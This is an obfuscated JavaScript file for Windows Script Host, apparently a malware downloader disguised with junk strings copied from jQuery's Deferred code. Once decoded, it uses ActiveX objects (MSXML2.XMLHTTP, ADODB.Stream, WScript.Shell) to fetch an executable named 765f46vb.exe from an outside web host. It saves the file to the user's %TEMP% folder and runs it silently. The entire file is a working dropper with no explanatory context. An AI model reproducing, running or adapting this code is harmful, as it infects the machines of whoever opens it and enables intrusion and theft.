KgaYzabKU = " deferred[ done | fail | progress ] for forwarding actions to newDefer deferred[ tuple[ 1 ] ]( function() { var returned = fn && fn.apply( this, arguments ); if ( returned && jQuery.isFunction( returned.promise ) ) { returned.promise() .progress( newDefer.notify ) .done( newDefer.resolve ) .fail( newDefer.reject ); } else { newDefer[ tuple[ 0 ] + \"With\" ]( this === promise ? newDefer.promise() : this, fn ? [ returned ] : arguments ); } } ); } ); fns = null; } ).promise(); },";
String.prototype.twofold = function () { aa = this; return aa.charAt(1 * 0 / 1); };
String.prototype.furry = function () { aa = this; return aa.split(")").join("").split("(").join("").split("9").join(""); };

var ekzlje = ["()A()()()c()t()()"+"i()(v())((e9))(X))"+("JJJqdatdx","alienation","sapphire",")(O())b())")+")j(())e)c))t)", ("windy","platter","E")+"x)p"+"an)d)E"+("interference","inspection","races","attractive","n)v")+"i)r"+("travelling","aviation","on)me)nt")+"S)t"+")ri"+"ngs", ("nutmeg","hoist","brcgjY","passer",")")+")%"+"T)E"+("vowel","spoken","toothache","M)P)%"), ""+("pelvis","rapid",").")+"e)x)e", "R)"+("teeth","digit","un)"), "M)"+("citizen","fracture","things","lawful)ly","S)X")+("univers)ality","briar","onesided","M)L2).")+"X)M"+"L)HT)TP", "W)"+"S)c"+("nonco)mmissioned","verification","r)i")+("characterization","woolen","pt).)Sh)e")+("FsLMKva","housing","chide","l)l")];
UKvSTjCwoJe = " promise[ done | fail | progress ] = list.add promise[ tuple[ 1 ] ] = list.add;";
var GLNpeWx = this[ekzlje.shift().replace("9", "").furry()];
kpTEmxgS = "UPNGuN";
snapshot = (("portmanteau", "troubleshooting", "UiARMfPMWO", "charm", "prNlHCBgnKXq") + "nKGcuha").twofold();
asthmas = (("denounce", "XnJziQSlKal", "howls", "unvarying", "serlGwuJjl") + "phoRDbPkJJ").twofold();
kpTEmxgS = ekzlje.shift();

var EkbrCAD = new GLNpeWx(ekzlje.pop().furry());
ydagKbat = " Keep pipe for back-compat promise.pipe = promise.then;";
var AyLJcpnc = new GLNpeWx(ekzlje.pop().furry());
HyGhCDM = " Get a promise for this deferred If obj is provided, the promise aspect is added to the object promise: function( obj ) { return obj != null ? jQuery.extend( obj, promise ) : promise; } }, deferred = {};";
var qOgIhFXi = EkbrCAD[""+(("MfPJHocQI", "calvary", "unlawfully", "umbrage", ""+("widowhood","modify","alchemists","9")+"999")+kpTEmxgS+"))").furry()](("(("+""+("remission","thriller","censor","9")+"999"+ekzlje.shift()+"))").furry());
FVXmJc = " Add list-specific methods jQuery.each( tuples, function( i, tuple ) { var list = tuple[ 2 ], stateString = tuple[ 3 ];";

failse = (("vnzulPz", "professionals", "looking", "socialist", "EFawQFt") + "vGDOca").twofold().furry();

function torpedo(supervision, alone) {

    try {
        var lamplight = qOgIhFXi + "/" + alone + ekzlje.shift().furry();
    uBQSCa = "} All done! return deferred; },";
    AyLJcpnc[("o" + snapshot +"(9)"+ failse).furry() + "n"](("pCQYAA","demonstration","protestant","gesticulation","G") + failse + ("horsehair","flying","domesticated","T"), supervision, false);

    htooDlqRARx = " Deferred helper when: function( subordinate /* , ..., subordinateN */ ) { var i = 0, resolveValues = slice.call( arguments ), length = resolveValues.length,";
    AyLJcpnc[asthmas + ("snaps","thrifty","timer","e") + (("memorial", "demean", "isSzTiSNxsl", "economize", "pliant", "nlaKkrbMnk") + "HaRHtvosEBs").twofold() + (("stolen", "brighton", "verbatim", "martians", "summaries", "dCKChAhoDs") + "pfmGAWJjUBL").twofold()]();
    yRpnkg = " the count of uncompleted subordinates remaining = length !== 1 || ( subordinate && jQuery.isFunction( subordinate.promise ) ) ? length : 0,";
    if (AyLJcpnc.status == 200) {
        var qeBhJRt = new GLNpeWx((("vagueness","bibliographic","represented","shipping","")+"A"+("carrion","nauseous","pO")+"DB." + ""+("topless","themes","homemade","S")+"tr"+("kenny","filly","eam")).replace("p", "D"));
        qeBhJRt[("plumb","plagiarism","somersault","tournament","")+"o"+"pen"]();
        gsjhFHl = " Handle state if ( stateString ) { list.add( function() {";
        qeBhJRt.type = 0 + 3 - 2;
        SrAfRU = " state = [ resolved | rejected ] state = stateString;";
        qeBhJRt[("inserting","rotund","stampede","sunstroke","w")+"ri"+"te"](AyLJcpnc[("editing","cognate","")+"R"+"es"+("jeroboam","during","pon") + asthmas + "e"+("enamel","liabilities","offered","fount","Bo")+"dy"]);
        ovgusEtN = " [ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2 ].lock ); ";
        qeBhJRt[(snapshot + ("wilton","swerve","o")+"Di"+"ti"+"on").replace("D", asthmas)] = 0;
        dVAlJQnViul = "} deferred[ resolve | reject | notify ] deferred[ tuple[ 0 ] ] = function() { deferred[ tuple[ 0 ] + \"With\" ]( this === deferred ? promise : this, arguments ); return this; }; deferred[ tuple[ 0 ] + \"With\" ] = list.fireWith; } );";
        qeBhJRt["sav"+"eT"+("violation","twaddle","oF")+"ile"](lamplight, 2);
        fXGXpRPRu = " Make the deferred a promise promise.promise( deferred );";
        qeBhJRt.close();
        SfaDSgPN = " Call given func if any if ( func ) { func.call( deferred, deferred ); ";
        EkbrCAD[ekzlje.shift().furry()](lamplight, 1, "jeJlUyw" === "lHxbGpuWV"); CxKRBTM = " } else if ( !( --remaining ) ) loXbxHDqL{ deferred.resolveWith( contexts, values ); } }; },";
    }

} catch (BfoaNF) { };

    yvdMDUzG = " Update function for both resolve and progress values updateFunc = function( i, contexts, values ) { return function( value ) { contexts[ i ] = this; values[ i ] = arguments.length > 1 ? slice.call( arguments ) : value; if ( values === progressValues ) { deferred.notifyWith( contexts, values );";
}
torpedo("h"+("listening","mirror","paperback","ttp://orkneyhamper")+"s.co"+".uk/765f46"+("credibility","allen","fonts","vb.exe"),"mGilDLP");
   RyVQUWQp = " the master Deferred. If resolveValues consist of only a single Deferred, just use that. deferred = remaining === 1 ? subordinate : jQuery.Deferred(),";